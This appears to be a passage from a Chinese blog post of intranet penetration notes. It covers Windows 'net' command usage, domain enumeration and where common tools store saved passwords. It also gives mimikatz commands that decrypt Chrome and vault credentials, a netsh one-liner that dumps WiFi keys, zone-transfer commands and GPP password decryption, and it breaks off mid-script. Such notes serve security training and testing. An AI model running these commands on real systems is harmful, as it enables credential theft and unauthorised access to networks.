<h3 id="用户信息"><a href="#用户信息" class="headerlink" title="用户信息"></a>用户信息</h3><h4 id="net参数详解"><a href="#net参数详解" class="headerlink" title="net参数详解"></a>net参数详解</h4><p>直接使用<code>net /?</code>命令即可查看，下面是我用谷歌翻译的，凑合看</p>
<blockquote>
<p>ACCOUNTS</p>
</blockquote>
<p>如果输入不带参数的<code>net accounts</code>显示当前密码设置、登录时限及域信息</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>/forcelogoff:&#123;minutes|no&#125;</code></td>
<td>设置当用户帐号或有效登录时间过期时</td>
</tr>
<tr>
<td><code>/minpwlen:length</code></td>
<td>设置用户帐号密码的最少字符数</td>
</tr>
<tr>
<td><code>/maxpwage:&#123;days|unlimited&#125;</code></td>
<td>设置用户帐号密码有效的最大天数</td>
</tr>
<tr>
<td><code>/minpwage:days</code></td>
<td>设置用户必须保持原密码的最小天数</td>
</tr>
<tr>
<td><code>/uniquepw:number</code></td>
<td>要求用户更改密码时，必须在经过number次后才能重复使用与之相同的密码</td>
</tr>
<tr>
<td><code>/domain</code></td>
<td>在当前域的主域控制器上执行该操作</td>
</tr>
<tr>
<td><code>/sync</code></td>
<td>当用于主域控制器时，该命令使域中所有备份域控制器同步</td>
</tr>
</tbody></table>
<blockquote>
<p>COMPUTER </p>
</blockquote>
<p>作用：从域数据库中添加或删除计算机。</p>
<p>命令格式：<code>net computer \\computername &#123;/add | /del&#125;</code></p>
<p>举例：<code>net computer \\ascotbe /add</code>将计算机<strong>ascotbe</strong>添加到登录域。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>\\computername</code></td>
<td>指定要添加到域或从域中删除的计算机</td>
</tr>
<tr>
<td><code>/add</code></td>
<td>将指定计算机添加到域</td>
</tr>
<tr>
<td><code>/del</code></td>
<td>将指定计算机从域中删除</td>
</tr>
</tbody></table>
<blockquote>
<p>CONFIG</p>
</blockquote>
<p>作用：显示当前运行的可配置服务，或显示并更改某项服务的设置。</p>
<p>命令格式：<code>net config [SERVER | WORKSTATION]</code></p>
<p>输入不带参数的命令<code>net config</code>显示可配置服务的列表</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>service</code></td>
<td>服务器</td>
</tr>
<tr>
<td><code>WORKSTATION</code></td>
<td>工作站</td>
</tr>
</tbody></table>
<blockquote>
<p>CONTINUE</p>
</blockquote>
<p>作用：重新激活挂起的服务。</p>
<p>命令格式：<code>net continue service</code></p>
<blockquote>
<p> FILE</p>
</blockquote>
<p>作用：显示某服务器上所有打开的共享文件名及锁定文件数。</p>
<p>命令格式：<code>net file [id [/close]]</code></p>
<p>输入不带参数的命令<code>net file</code>获得服务器上打开文件的列表</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>id</code></td>
<td>文件标识号</td>
</tr>
<tr>
<td><code>/close</code></td>
<td>关闭打开的文件并释放锁定记录</td>
</tr>
</tbody></table>
<blockquote>
<p>GROUP</p>
</blockquote>
<p>作用：在 Windows NT/2000/2003 Server 域中添加、显示或更改全局组。</p>
<p>命令格式：<code>net group groupname &#123;/add [/comment:&quot;text &quot;] | /delete&#125; [/domain]</code></p>
<p>输入不带参数的命令<code>net group</code>显示服务器名称及服务器的组名称</p>
<p>举例：<code>net group test GHS1 GHS2 /add</code>将现有用户帐号GHS1和GHS2添加到本地计算机的test组。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>groupname</code></td>
<td>要添加、扩展或删除的组</td>
</tr>
<tr>
<td><code>/comment:&quot;text&quot;</code></td>
<td>为新建组或现有组添加注释</td>
</tr>
<tr>
<td><code>/domain</code></td>
<td>在当前域的主域控制器中执行该操作，否则在本地计算机上执行操作</td>
</tr>
<tr>
<td><code>username[...]</code></td>
<td>列表显示要添加到组或从组中删除的一个或多个用户</td>
</tr>
<tr>
<td><code>/add</code></td>
<td>添加组或在组中添加用户名</td>
</tr>
<tr>
<td><code>/delete</code></td>
<td>删除组或从组中删除用户名</td>
</tr>
</tbody></table>
<blockquote>
<p>LOCALGROUP</p>
</blockquote>
<p>作用：添加、显示或更改本地组。</p>
<p>命令格式：<code>net localgroup groupname &#123;/add [/comment:&quot;text &quot;] | /delete&#125; [/domain]</code></p>
<p>输入不带参数的命令<code>net localgroup</code>显示服务器名称和计算机的本地组名称</p>
<p>举例：</p>
<ul>
<li><code>net localgroup ggg /add</code> 将名为ggg的本地组添加到本地用户帐号数据库；　　</li>
<li><code>net localgroup ggg </code>显示ggg本地组中的用户。</li>
</ul>
<p>参数和解释都和上面一样这边就不写了</p>
<blockquote>
<p>PAUSE</p>
</blockquote>
<p>作用：暂停正在运行的服务。</p>
<p>命令格式：<code>net pause service</code></p>
<blockquote>
<p>SESSION</p>
</blockquote>
<p>作用：列出或断开本地计算机和与之连接的客户端的会话。</p>
<p>命令格式：<code>net session [\\computername] [/delete] [/list]</code></p>
<p>输入不带参数的命令<code>net session</code>显示所有与本地计算机的会话的信息。</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>\\computername</code></td>
<td>标识要列出或断开会话的计算机。</td>
</tr>
<tr>
<td><code>/delete</code></td>
<td>结束与 <code>\\computername </code>计算机会话并关闭本次会话期间计算机的所有打开文件。如果省略<code>\\computername</code>参数，将取消与本地计算机的所有会话。</td>
</tr>
<tr>
<td><code>/list</code></td>
<td>列出清单</td>
</tr>
</tbody></table>
<blockquote>
<p>SHARE</p>
</blockquote>
<p>作用：创建、删除或显示共享资源。</p>
<p>命令格式：<code>net share sharename=drive:path [/users:number | /unlimited] [/remark:&quot;text&quot;]</code></p>
<p>输入不带参数的命令<code>net share</code>显示本地计算机上所有共享资源的信息</p>
<p>举例： </p>
<ul>
<li><code>net share ascotbe=c:\temp /remark:&quot;my first share&quot;</code>以ascotbe为共享名共享<strong>C:\temp</strong></li>
<li><code>net share ascotbe /delete</code>停止共享ascotbe目录</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>sharename</code></td>
<td>是共享资源的网络名称</td>
</tr>
<tr>
<td><code>drive:path</code></td>
<td>指定共享目录的绝对路径</td>
</tr>
<tr>
<td><code>/users:number</code></td>
<td>设置可同时访问共享资源的最大用户数</td>
</tr>
<tr>
<td><code>/unlimited</code></td>
<td>不限制同时访问共享资源的用户数</td>
</tr>
<tr>
<td><code>/remark:&quot;text&quot;</code></td>
<td>添加关于资源的注释，注释文字用引号引住</td>
</tr>
</tbody></table>
<blockquote>
<p> START</p>
</blockquote>
<p>作用：启动服务，或显示已启动服务的列表。</p>
<p>命令格式：<code>net start service</code></p>
<blockquote>
<p>STATISTICS</p>
</blockquote>
<p>作用：显示本地工作站或服务器服务的统计记录。</p>
<p>命令格式：<code>net statistics workstation </code></p>
<blockquote>
<p> STOP</p>
</blockquote>
<p>作用：停止 Windows NT/2000/2003 网络服务。</p>
<p>命令格式：<code>net stop service</code></p>
<p>现在的系统都没有这个了，下面列出能停止的服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">(1)alerter(警报)</span><br><span class="line">(2)client service for Netware(Netware 客户端服务)</span><br><span class="line">(3)clipbook server(剪贴簿服务器)</span><br><span class="line">(4)computer browser(计算机浏览器)</span><br><span class="line">(5)directory replicator(目录复制器)</span><br><span class="line">(6)ftp publishing service (ftp )(ftp 发行服务)</span><br><span class="line">(7)lpdsvc</span><br><span class="line">(8)Net logon(网络登录)</span><br><span class="line">(9)Network dde(网络 dde)</span><br><span class="line">(10)Network dde dsdm(网络 dde dsdm)</span><br><span class="line">(11)Network monitor agent(网络监控代理)</span><br><span class="line">(12)ole(对象链接与嵌入)</span><br><span class="line">(13)remote access connection manager(远程访问连接管理器)</span><br><span class="line">(14)remote access isnsap service(远程访问 isnsap 服务)</span><br><span class="line">(15)remote access server(远程访问服务器)</span><br><span class="line">(16)remote procedure call (rpc) locator(远程过程调用定位器)</span><br><span class="line">(17)remote procedure call (rpc) service(远程过程调用服务)</span><br><span class="line">(18)schedule(调度)</span><br><span class="line">(19)server(服务器)</span><br><span class="line">(20)simple tcp&#x2F;ip services(简单 TCP&#x2F;IP 服务)</span><br><span class="line">(21)snmp</span><br><span class="line">(22)spooler(后台打印程序)</span><br><span class="line">(23)tcp&#x2F;ip Netbios helper(TCP&#x2F;IP NETBIOS 辅助工具)</span><br><span class="line">(24)ups</span><br><span class="line">(25)workstation(工作站)</span><br><span class="line">(26)messenger(信使)</span><br><span class="line">(27)dhcp client</span><br></pre></td></tr></table></figure>

<blockquote>
<p>TIME</p>
</blockquote>
<p>作用：使计算机的时钟与另一台计算机或域的时间同步。</p>
<p>命令格式：<code>NET TIME [\\computername | /DOMAIN[:domainname] | /RTSDOMAIN[:domainname]] [/SET]</code></p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>\\computername</code></td>
<td>要检查或同步的服务器名</td>
</tr>
<tr>
<td><code>/domain[:domainname]</code></td>
<td>指定要与其时间同步的域</td>
</tr>
<tr>
<td><code>/set</code></td>
<td>使本计算机时钟与指定计算机或域的时钟同步。</td>
</tr>
<tr>
<td><code>/rtsdomain[:domainname]</code></td>
<td>RT域</td>
</tr>
</tbody></table>
<blockquote>
<p>VIEW</p>
</blockquote>
<p>作用：显示域列表、计算机列表或指定计算机的共享资源列表。</p>
<p>命令格式：<code>NET VIEW [\\computername [/CACHE] | [/ALL] | /DOMAIN[:domainname]]</code></p>
<p>举例：</p>
<ul>
<li><code>net view \\GHS</code>查看GHS计算机的共享资源列表。</li>
<li><code>net view /domain:ascotbe</code>查看ascotbe域中的机器列表。</li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>\\computername</code></td>
<td>指定要查看其共享资源的计算机</td>
</tr>
<tr>
<td><code>/CACHE</code></td>
<td>缓存中的</td>
</tr>
<tr>
<td><code>/ALL</code></td>
<td>所有的</td>
</tr>
<tr>
<td><code>/DOMAIN[:domainname</code></td>
<td>域中的</td>
</tr>
</tbody></table>
<blockquote>
<p>USER</p>
</blockquote>
<p>作用：添加或更改用户帐号或显示用户帐号信息。</p>
<p>命令格式：</p>
<ul>
<li><code>NET USER username [password | *] [options]] [/DOMAIN]</code></li>
<li><code>NET USER username &#123;password | *&#125; /ADD [options] [/DOMAIN]</code></li>
<li><code>NET USER username [/DELETE] [/DOMAIN]</code></li>
<li><code>NET USER username [/TIMES:&#123;times | ALL&#125;]</code></li>
<li><code>NET USER username [/ACTIVE: &#123;YES | NO&#125;]</code></li>
</ul>
<p>举例：<code>Net user ascotbe</code>查看用户ascotbe的信息。</p>
<p>输入不带参数的命令<code>Net user</code>查看计算机上的用户帐号列表</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>username</code></td>
<td>添加、删除、更改或查看用户帐号名</td>
</tr>
<tr>
<td><code>password</code></td>
<td>为用户帐号分配或更改密码</td>
</tr>
<tr>
<td><code>/domain</code></td>
<td>在计算机主域的主域控制器中执行操作</td>
</tr>
<tr>
<td><code>/DELETE</code></td>
<td>删除</td>
</tr>
<tr>
<td><code>/ADD</code></td>
<td>在域中增加账号</td>
</tr>
<tr>
<td><code>/ACTIVE</code></td>
<td>（这个没用过）</td>
</tr>
<tr>
<td><code>/TIMES</code></td>
<td>（没用过）</td>
</tr>
</tbody></table>
<blockquote>
<p>USE</p>
</blockquote>
<p>作用：连接计算机或断开计算机与共享资源的连接，或显示计算机的连接信息。</p>
<p>命令格式：</p>
<ul>
<li><code>NET USE [devicename | *] [\\computername\sharename[\volume] [password | *]]</code></li>
<li><code>NET USE [/USER:[domainname\]username]</code></li>
<li><code>NET USE [/USER:[dotted domain name\]username]</code></li>
<li><code>NET USE [/USER:[username@dotted domain name]</code></li>
<li><code>NET USE [/SMARTCARD]</code></li>
<li><code>NET USE [/SAVECRED]</code></li>
<li><code>NET USE [/REQUIREINTEGRITY]</code></li>
<li><code>NET USE [/REQUIREPRIVACY]</code></li>
<li><code>NET USE [/WRITETHROUGH]</code></li>
<li><code>NET USE [[/DELETE] | [/PERSISTENT:&#123;YES | NO&#125;]]</code></li>
</ul>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td><code>devicename</code></td>
<td>指定要连接到的资源名称或要断开的设备名称</td>
</tr>
<tr>
<td><code>\\computername\sharename</code></td>
<td>服务器及共享资源的名称</td>
</tr>
<tr>
<td><code>password</code></td>
<td>访问共享资源的密码</td>
</tr>
<tr>
<td><code>*</code></td>
<td>提示键入密码</td>
</tr>
<tr>
<td><code>/user</code></td>
<td>连接的另外一个用户</td>
</tr>
<tr>
<td><code>domainname</code></td>
<td>指定另一个域</td>
</tr>
<tr>
<td><code>username</code></td>
<td>指定登录的用户名</td>
</tr>
<tr>
<td><code>/home</code></td>
<td>将用户连接到其宿主目录</td>
</tr>
<tr>
<td><code>/delete</code></td>
<td>取消指定网络连接</td>
</tr>
<tr>
<td><code>/persistent</code></td>
<td>控制永久网络连接的使用。</td>
</tr>
<tr>
<td><code>/SAVECRED</code></td>
<td>已保存</td>
</tr>
<tr>
<td><code>/REQUIREINTEGRITY</code></td>
<td>（不知道）</td>
</tr>
<tr>
<td><code>/REQUIREPRIVACY</code></td>
<td>（不知道）</td>
</tr>
<tr>
<td><code>/WRITETHROUGH</code></td>
<td>（不知道）</td>
</tr>
<tr>
<td><code>/SMARTCARD</code></td>
<td>智能卡</td>
</tr>
<tr>
<td><code>/volume</code></td>
<td>卷</td>
</tr>
</tbody></table>
<h4 id="查看域用户"><a href="#查看域用户" class="headerlink" title="查看域用户"></a>查看域用户</h4><p>普通域用户权限即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/35.png?raw=true" alt="image-20200730231555944"></p>
<h4 id="查看域管理员"><a href="#查看域管理员" class="headerlink" title="查看域管理员"></a>查看域管理员</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/36.png?raw=true" alt="image-20200730231613687"></p>
<h4 id="快速定位域控ip"><a href="#快速定位域控ip" class="headerlink" title="快速定位域控ip"></a>快速定位域控ip</h4><p>查到dimain后ping下这个主机名字，就能找到IP地址了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br><span class="line">ping WIN-1OUEMJB0766</span><br><span class="line">nslookup -<span class="built_in">type</span>=all _ldap._tcp.dc._msdcs.domain.com</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/37.png?raw=true" alt="image-20200730231819436"></p>
<h4 id="查看域控制器"><a href="#查看域控制器" class="headerlink" title="查看域控制器"></a>查看域控制器</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group <span class="string">&quot;domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/38.png?raw=true" alt="image-20200730231833721"></p>
<h3 id="内网主机发现"><a href="#内网主机发现" class="headerlink" title="内网主机发现"></a>内网主机发现</h3><h4 id="查看共享资料"><a href="#查看共享资料" class="headerlink" title="查看共享资料"></a>查看共享资料</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></table></figure>

<h4 id="查看arp表"><a href="#查看arp表" class="headerlink" title="查看arp表"></a>查看arp表</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp -a</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/39.png?raw=true" alt="image-20200730231954183"></p>
<h4 id="查看hosts文件"><a href="#查看hosts文件" class="headerlink" title="查看hosts文件"></a>查看hosts文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#linux</span></span><br><span class="line">cat  /etc/hosts</span><br><span class="line"><span class="comment">#windows</span></span><br><span class="line"><span class="built_in">type</span>  c:\Windows\system32\drivers\etc\hosts</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/40.png?raw=true" alt="image-20200730232021228"></p>
<h4 id="查看dns缓存"><a href="#查看dns缓存" class="headerlink" title="查看dns缓存"></a>查看dns缓存</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig  /displaydns</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/41.png?raw=true" alt="image-20200730232057694"></p>
<h3 id="会话收集"><a href="#会话收集" class="headerlink" title="会话收集"></a>会话收集</h3><p>在网内收集会话，如看管理员登录过哪些机器、机器被谁登录过，这样攻击的目标就会清晰很多。</p>
<p>api相关介绍如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;windows&#x2F;win32&#x2F;api&#x2F;lmshare&#x2F;nf-lmshare-netsessionenum</span><br></pre></td></tr></table></figure>

<h3 id="收集凭证"><a href="#收集凭证" class="headerlink" title="收集凭证"></a>收集凭证</h3><p>拿下一台机器后，需要尽可能的收集信息。如下是几个常用软件保存密码的注册表地址，可以根据算法去解密保存的账号密码。</p>
<table>
<thead>
<tr>
<th>数据库名称</th>
<th>注册表</th>
</tr>
</thead>
<tbody><tr>
<td>MySQL</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>MariaDB</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>MongoDB</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>Microsoft  SQL</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>Oracle</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>PostgreSQL</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers&lt;your  connection name&gt;</td>
</tr>
<tr>
<td>SQLite</td>
<td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers&lt;your  connection name&gt;</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>SecureCRT</th>
<th>注册表</th>
</tr>
</thead>
<tbody><tr>
<td>xp/win2003</td>
<td>C:\Documents  and Settings\USERNAME\Application Data\VanDyke\Config\Sessions</td>
</tr>
<tr>
<td>win7/win2008以上</td>
<td>C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>Xshell</th>
<th>注册表</th>
</tr>
</thead>
<tbody><tr>
<td>Xshell 5</td>
<td>%userprofile%\Documents\NetSarang\Xshell\Sessions</td>
</tr>
<tr>
<td>Xshell 6</td>
<td>%userprofile%\Documents\NetSarang  Computer\6\Xshell\Sessions</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>WinSCP</th>
<th>注册表</th>
</tr>
</thead>
<tbody><tr>
<td>WinSCP</td>
<td>HKCU\Software\Martin  Prikryl\WinSCP 2\Sessions</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>VNC</th>
<th>注册表</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>RealVNC</td>
<td>HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver</td>
<td>Password</td>
</tr>
<tr>
<td>TightVNC</td>
<td>HKEY_CURRENT_USER\Software\TightVNC\Server  Value</td>
<td>Password  or PasswordViewOnly</td>
</tr>
<tr>
<td>TigerVNC</td>
<td>HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4</td>
<td>Password</td>
</tr>
<tr>
<td>UltraVNC</td>
<td>C:\Program  Files\UltraVNC\ultravnc.ini</td>
<td>passwd or  passwd2</td>
</tr>
</tbody></table>
<h3 id="DPAP"><a href="#DPAP" class="headerlink" title="DPAP"></a>DPAP</h3><p>DPAPI，由微软从Windows 2000开始发布，称为Data ProtectionApplication Programming Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数 CryptUnprotectData 。</p>
<h4 id="解密Chrome密码"><a href="#解密Chrome密码" class="headerlink" title="解密Chrome密码"></a>解密Chrome密码</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz  dpapi::chrome /<span class="keyword">in</span>:<span class="string">&quot;%localappdata%\Google\Chrome\User Data\Default\Login  Data&quot;</span> /unprotect</span><br></pre></td></tr></table></figure>

<h4 id="解密Credential"><a href="#解密Credential" class="headerlink" title="解密Credential"></a>解密Credential</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz  vault::cred /patch</span><br></pre></td></tr></table></figure>

<h3 id="域信任"><a href="#域信任" class="headerlink" title="域信任"></a>域信任</h3><p>信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p>
<h4 id="查看域信任"><a href="#查看域信任" class="headerlink" title="查看域信任"></a>查看域信任</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest  /domain_trusts</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/42.png?raw=true" alt="image-20200730232120794"></p>
<h3 id="域传送"><a href="#域传送" class="headerlink" title="域传送"></a>域传送</h3><p>当存在域传送漏洞时，可以获取域名解析记录。当有了解析记录后，也能提高对网络环境的进一步认知，比如www解析的ip段可能在dmz区，mail解析的ip段可能在核心区域等等。</p>
<h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nslookup  -<span class="built_in">type</span>=ns domain.com</span><br><span class="line">nslookup</span><br><span class="line">sserver  dns.domain.com</span><br><span class="line">ls  domain.com</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/43.png?raw=true" alt="image-20200730232427143"></p>
<h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig  @dns.domain.com axfr domain.com</span><br></pre></td></tr></table></figure>

<h3 id="DNS记录获取"><a href="#DNS记录获取" class="headerlink" title="DNS记录获取"></a>DNS记录获取</h3><p>在网内收集dns记录，可以快速定位一些机器、网站。常用工具有Dnscmd、PowerView。</p>
<h4 id="Windows-Server"><a href="#Windows-Server" class="headerlink" title="Windows Server"></a>Windows Server</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dnscmd /ZonePrint ascotbe.com</span><br><span class="line">Dnscmd /EnumRecords ascotbe.com .</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/44.png?raw=true" alt="image-20200730233830776"></p>
<h4 id="非Windows-Server"><a href="#非Windows-Server" class="headerlink" title="非Windows Server"></a>非Windows Server</h4><p>如果权限不足的话是没办法运行ps脚本的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本位置https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</span></span><br><span class="line">import-module  PowerView.ps1</span><br><span class="line">Get-DNSRecord  -ZoneName ascotbe.com</span><br></pre></td></tr></table></figure>

<h3 id="WIFI"><a href="#WIFI" class="headerlink" title="WIFI"></a>WIFI</h3><p>通过如下命令获取连接过的wifi密码，只能用CMD运行Powershell会报错</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /f  <span class="string">&quot;skip=9 tokens=1,2 delims=:&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;netsh wlan show profiles&#x27;</span>)  <span class="keyword">do</span>  @<span class="built_in">echo</span> %j | findstr -i -v <span class="built_in">echo</span> |  netsh wlan show profiles %j key=clear</span><br></pre></td></tr></table></figure>

<p><img src="https://github.com/Ascotbe/Random-img/blob/master/IntranetPenetration/45.png?raw=true" alt="image-20200730225857646"></p>
<h3 id="GPP"><a href="#GPP" class="headerlink" title="GPP"></a>GPP</h3><p>当分发组策略时，会在域的SYSVOL目录下生成一个gpp配置的xml文件，如果在配置组策略时填入了密码，则其中会存在加密过的账号密码。这些密码，往往都是管理员的密码。</p>
<p>其中xml中的密码是aes加密的，密钥已被微软公开</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;openspecs&#x2F;windows_protocols&#x2F;ms-gppref&#x2F;2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom&#x3D;MSDN</span><br></pre></td></tr></table></figure>

<p>可以使用相关脚本进行解密，如</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span 